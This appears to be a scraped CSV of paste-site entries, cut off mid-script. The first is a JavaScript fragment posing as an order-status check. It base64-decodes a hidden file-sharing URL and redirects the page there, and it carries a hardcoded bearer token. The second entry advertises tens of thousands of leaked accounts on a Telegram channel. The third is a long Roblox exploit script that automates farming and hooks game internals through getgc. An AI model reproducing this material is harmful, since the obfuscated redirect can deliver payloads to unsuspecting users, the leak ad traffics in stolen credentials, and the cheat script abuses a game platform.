id,title,username,language,date,content
  const apiEndpoint = ""/v1/order/87487/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mfqr7UVB,Leaked Accounts - Fresh Hits,kammex,JavaScript,Monday 28th of April 2025 11:22:32 PM CDT,83793 Accounts Posted On https://t.me/leakzbyeminem
KVEb0Uz4,Hohami,suramraja1,Lua,Monday 28th of April 2025 11:18:06 PM CDT,"--BGSI New


if not game:IsLoaded() then
    game.Loaded:wait()
end

task.wait(10)

--[[setfpscap(55)
print(""FPS CAP 15"")]]--

-- Run a single check for 100M Egg availability
spawn(function()
    local success, result = pcall(function()
        -- Wait a bit to ensure the game is fully loaded
        task.wait(60)
        
        -- Check if the Generic folder exists
        if workspace:FindFirstChild(""Rendered"") and workspace.Rendered:FindFirstChild(""Generic"") then
            -- Check if 100M Egg exists directly
            if workspace.Rendered.Generic:FindFirstChild(""100M Egg"") then
                return true -- Egg found
            else
                -- Iterate through all children of Generic to find 100M Egg
                for i, v in pairs(workspace.Rendered.Generic:GetChildren()) do
                    if v.Name == ""100M Egg"" then
                        return true -- Egg found
                    end
                end
            end
        end
        
        -- If we reach here, egg was not found
        game:GetService(""Players"").LocalPlayer:Kick(""100M Egg not available in this server. Please rejoin a different server."")
        return false
    end)
    
    if not success then
        print(""Error checking for 100M Egg: "" .. tostring(result))
    end
end)

spawn(function() -- anti afk
    task.wait(30)

    local vu = game:GetService(""VirtualUser"")
    game:GetService(""Players"").LocalPlayer.Idled:connect(function()
        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        wait(1)
        vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
end)

spawn(function() -- remove hatach animation
    task.wait(30)
    
    local HatchEggModule = nil

    for _, func in next, getgc(true) do
        if typeof(func) == ""function"" and getfenv(func).script then
            local scriptName = getfenv(func).script.Name
            local scriptParent = getfenv(func).script.Parent

            -- Look for the right module
            if scriptName == ""HatchEgg"" and tostring(scriptParent) == ""Effects"" then
                local env = getfenv(func)
                local module = require(env.script)

                if typeof(module) == ""table"" then
                    HatchEggModule = module
                    break
                end
            end
        end
    end

    -- Disable all functions in the HatchEgg module
    if HatchEggModule then
        for key, value in pairs(HatchEggModule) do
            if typeof(value) == ""function"" then
                HatchEggModule[key] = function(...) return end
            end
        end
        print(""✅ Hatch animation functions disabled."")
    else
        warn(""❌ Failed to find HatchEgg module."")
    end
end)

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Local Stuff ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local GuiService            = game:GetService(""GuiService"")
local VIM                   = game:GetService(""VirtualInputManager"")
local TweenService          = game:GetService(""TweenService"")
local Players               = game:GetService(""Players"")
local HttpService           = game:GetService(""HttpService"")
local Remote                = game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote
local LocalDataService      = require(game:GetService(""ReplicatedStorage"").Client.Framework.Services.LocalData)
local data                  = LocalDataService:Get()

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Trade Secret Pets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local AutoTradeSecretPets_Toggle = false
local tradeThread = nil
local targetTradeName = ""PixyPalx"" -- Target player name (can be easily changed)

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Bubble & Sell Function ━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local Auto_Bubble_And_Sell_Active = false
local Auto_Bubble_And_Sell_Thread = nil

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Use Potion Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local isAutoUsingPotions = false
local autoUsingPotionsThread = nil
local isHatchingX25Egg = false  -- New flag to track if we're hatching a x25 egg

-- List of regular potions we want to maintain active all the time
local priorityPotions = {
    ""Lucky"",
    ""Speed"",
    ""Mythic""
}

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Collect Pickup Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local isAutoCollectingPickups = false
local autoCollectingPickupsThread = nil

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Hatch Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local isAutoHatching = false
local autoHatchingThread = nil
local tempDisableHatching = false
local pickupCollectionStartedByHatcher = false -- Track if we started pickup collection

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━ Coin & Gems Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local Max_Coins =   400000000000 --400B
local Low_Coins =   100000000 --100M

local Max_Gems  =   100000000 --100M
local Low_Gems  =   10000000 --10M

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Enchant Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀
-- 🔧 CONFIG: Desired Enchants and Level
local enchants = {
    [""team-up""] = 5
}
-- 🧪 You can add more like:
-- [""strong""]   = 2,
-- [""bubbler""]  = 5,
-- [""looter""]   = 5,
-- [""gleaming""] = 5

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Area To Unlock ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀
-- 🔧 CONFIG: Areas to Unlock
local AreaToUnlock = {
    ""Floating Island"",
    ""Outer Space"",
    ""Twilight"",
    ""The Void"",
    ""Zen""
}

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Mastery ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local isAutoMastery = false -- Flag to track if we're automatically upgrading mastery
local autoMasteryThread = nil -- Variable to store the auto mastery thread

local PetsMasteryCompleted = false  -- Flag to track if Pets mastery reached target
local BuffsMasteryCompleted = false  -- Flag to track if Buffs mastery reached target
local ShopsMasteryCompleted = false  -- Flag to track if Shops mastery reached target
local AllMasteryCompleted = false  -- Flag to track if all mastery reached targets

local Target_Pets_Mastery = 15
local Target_Buffs_Mastery = 17
local Target_Shops_Mastery = 10

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Egg Counter ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

-- Add these at the top with your other global variables
local EggCounterGui = nil
local isEggCounterEnabled = false
local CurrentlyHatchingEgg = nil

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Secret Pet Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

-- Define list of secret pets
local SecretPets = {
    ""Avernus"",
    ""King Doggy"",
    ""The Overlord"",
    ""MAN FACE GOD"",
    ""Royal Trophy"",
    ""Giant Chocolate Chicken"",
    ""Easter Basket"",
    ""Dementor"",
    ""Godly Gem""
    -- Add more pet names here
}

local SecretPetCheck_Toggle = false
local SecretPetOverlay = nil

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Egg List & Priority ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local Default_Egg = CFrame.new(19, 2, -2)

-- Define egg mapping - workspace model name to actual egg name for remote call
local eggMapping = {
    [""common-egg""] = ""Common Egg"",
    [""void-egg""] = ""Void Egg"",
    --[""nightmare-egg""] = ""Nightmare Egg"",
    --[""aura-egg""] = ""Aura Egg"",
    --[""event-3""] = ""Throwback Egg"",  -- Correct event egg name
    [""silly-egg""] = ""Silly Egg"",
    [""100M Egg""] = ""100M Egg""

}

-- Prioritize eggs (higher index = higher priority)
local eggPriority = {
   -- ""event-3"", -- Highest priority
    ""silly-egg"",
   -- ""aura-egg"",
    --""nightmare-egg"",
    ""void-egg"",
    ""common-egg"", -- Lowest priority
    ""100M Egg""
}

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━ Auto Craft Potion Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

-- Configuration
local potionTypes = {
    ""Lucky"",
    ""Speed"",
    ""Mythic"",
    ""Coins""
}

-- Define crafting requirements for each tier
local craftingRequirements = {
    [2] = 4,  -- Level 2 requires 4x Level 1
    [3] = 4,  -- Level 3 requires 4x Level 2
    [4] = 6,  -- Level 4 requires 6x Level 3
    [5] = 8   -- Level 5 requires 8x Level 4
}


-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Pet List To Delete ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

-- The threshold amount to keep for all pets in the list
local petKeepThreshold = 1 --Normal pet type
local shinyKeepThreshold = 5  --shiny pet type

-- List of pet names to delete when they exceed 10
local petsToDelete = {
    --Common Egg
    ""Doggy"",
    ""Kitty"",
    ""Bunny"",
    ""Bear"",
    --Common Egg
    ""Mouse"",
    ""Wolf"",
    ""Fox"",
    ""Polar Bear"",
    ""Panda"",
    --Spotted Egg
    ""Ice Kitty"",
    ""Deer"",
    ""Ice Wolf"",
    ""Piggy"",
    ""Ice Deer"",
    ""Ice Dragon"",
    --Spikey Egg
    ""Golem"",
    ""Dinosaur"",
    ""Ruby Golem"",
    ""Dragon"",
    ""Dark Dragon"",
    ""Emerald Golem"",
    --Magma Egg
    ""Magma Doggy"",
    ""Magma Deer"",
    ""Magma Fox"",
    ""Magma Bear"",
    ""Demon"",
    ""Inferno Dragon"",
    --Crystal Egg
    ""Cave Bat"",
    ""Dark Bat"",
    ""Angel"",
    ""Emerald Bat"",
    ""Unicorn"",
    ""Flying Pig"",
    --Lunar Egg
    ""Space Mouse"",
    ""Space Bull"",
    ""Lunar Fox"",
    ""Lunarcorn"",
    ""Lunar Serpent"",
    ""Electra"",
    --Void Egg
    ""Void Kitty"",
    ""Void Bat"",
    ""Void Demon"",
    ""Dark Phoenix"",
    ""Neon Elemental"",
    --Hell Egg
    ""Hell Piggy"",
    ""Hell Dragon"",
    ""Hell Crawler"",
    ""Inferno Demon"",
    ""Inferno Cube"",
    ""Virus"",
    --Nightmare Egg
    ""Demon Doggy"",
    ""Skeletal Deer"",
    ""Night Crawler"",
    ""Hell Bat"",
    ""Green Hydra"",
    ""Demonic Hydra"",
    --Rainbow Egg
    ""Red Golem"",
    ""Orange Deer"",
    ""Yellow Fox"",
    ""Green Angel"",
    --Aura Egg
    ""Manny"",
    ""Manicorn"",
    ""Sigma Serpent"",
    ""Manarium"",
    --Pastel Egg
    ""Paper Doggy"",
    ""Paper Bunny"",
    ""Chubby Bunny"",
    ""Hatchling"",
    --Bunny Egg
    ""Bunny Doggy"",
    ""Egg Bunny"",
    ""Angel Bunny"",
    ""Seraphic Bunny"",
    --Throwback Egg
    ""Bow Bunny"",
    ""Easter Egg"",
    ""Flying Bunny"",
    ""Easter Serpent"",
    --100M Egg
    ""Bronze Bunny"",
    ""Silver Fox"",
    ""Golden Dragon"",
    ""Diamond Serpent"",
    ""Diamond Hexarium"",
    ""King Pufferfish""
}

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Flavors & Gum Settings ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

-- Auto buy variables
local AutoBuy_Toggle = false
local Buy_Thread = nil
local max_Flavor_Reached = false
local max_Gum_Reached = false
local max_Upgrades_Reached = false

-- 🔧 CONFIG: Flavors to Buy (sorted by price)
local flavorsConfig = {
    [""Blueberry""] = {
        price = 25,
        currency = ""Coins""
    },
    [""Cherry""] = {
        price = 500,
        currency = ""Coins""
    },
    [""Pizza""] = {
        price = 1500,
        currency = ""Coins""
    },
    [""Watermelon""] = {
        price = 3500,
        currency = ""Coins""
    },
    [""Chocolate""] = {
        price = 10000,
        currency = ""Coins""
    },
    [""Contrast""] = {
        price = 35000,
        currency = ""Coins""
    },
    [""Gold""] = {
        price = 100000,
        currency = ""Coins""
    },
    [""Lemon""] = {
        price = 450000,
        currency = ""Coins""
    },
    [""Donut""] = {
        price = 1500000,
        currency = ""Coins""
    },
    [""Swirl""] = {
        price = 30000000,
        currency = ""Coins""
    },
    [""Molten""] = {
        price = 350000000,
        currency = ""Coins""
    }
}

-- 🔧 CONFIG: Gum to Buy (sorted by price)
local gumConfig = {
    [""Stretchy Gum""] = {
        price = 25,
        currency = ""Coins""
    },
    [""Chewy Gum""] = {
        price = 250,
        currency = ""Coins""
    },
    [""Epic Gum""] = {
        price = 1500,
        currency = ""Coins""
    },
    [""Ultra Gum""] = {
        price = 5000,
        currency = ""Coins""
    },
    [""Omega Gum""] = {
        price = 12000,
        currency = ""Coins""
    },
    [""Unreal Gum""] = {
        price = 45000,
        currency = ""Coins""
    },
    [""Cosmic Gum""] = {
        price = 125000,
        currency = ""Coins""
    },
    [""XL Gum""] = {
        price = 650000,
        currency = ""Coins""
    },
    [""Mega Gum""] = {
        price = 1500000,
        currency = ""Coins""
    },
    [""Quantum Gum""] = {
        price = 5000000000,
        currency = ""Coins""
    },
    [""Alien Gum""] = {
        price = 35000000,
        currency = ""Coins""
    },
    [""Radioactive Gum""] = {
        price = 150000000,
        currency = ""Coins""
    },
    [""Experiment #52""] = {
        price = 1000000000,
        currency = ""Coins""
    }
}

-- 🌀━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Helper ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🌀

local function GetCurrentCoins()
    return LocalDataService:Get().Coins
end

local function GetCurrentGems()
    return LocalDataService:Get().Gems
end

local function getPetById(data, id)
    for _, pet in ipairs(data.Pets) do
        if pet.Id == id then
            return pet
        end
    end
end

-- Function to format numbers with suffixes (K, M, B, T, etc.)
local function FormatNumberCompact(num)
    if num >= 1e18 then return string.format(""%.1fQnt"", num / 1e18)
    elseif num >= 1e15 then return string.format(""%.1fQ"", num / 1e15)
    elseif num >= 1e12 then return string.format(""%.1fT"", num / 1e12)
    elseif num >= 1e9 then return string.format(""%.1fB"", num / 1e9)
    elseif num >= 1e6 then return string.format(""%.1fM"", num / 1e6)
    elseif num >= 1e3 then return string.format(""%.1fK"", num / 1e3)
    else return tostring(num)
    end
end

local function extractNumbers(text)
    -- Remove all HTML-like tags
    local cleanText = text:gsub(""<[^>]+>"", """")
    
    -- Extract the text before and after the slash
    local currentStr, maxStr = cleanText:match(""([%d%,%.]+)%s*/%s*([%d%,%.]+)"")
    
    if not currentStr or not maxStr then
        return nil, nil
    end
    
    -- Remove commas from the numbers
    currentStr = currentStr:gsub("","", """")
    maxStr = maxStr:gsub("","", """")
    
    -- Convert to numbers
    return tonumber(currentStr), tonumber(maxStr)
end

-- Function to convert price text to a number value
local function convertPriceToNumber(priceText)
    -- Remove commas and spaces
    local cleanPrice = priceText:gsub("","", """"):gsub(""%s+"", """")
    
    -- Check for suffixes like K, M, B
    local value = tonumber(cleanPrice:match(""^%d+%.?%d*""))
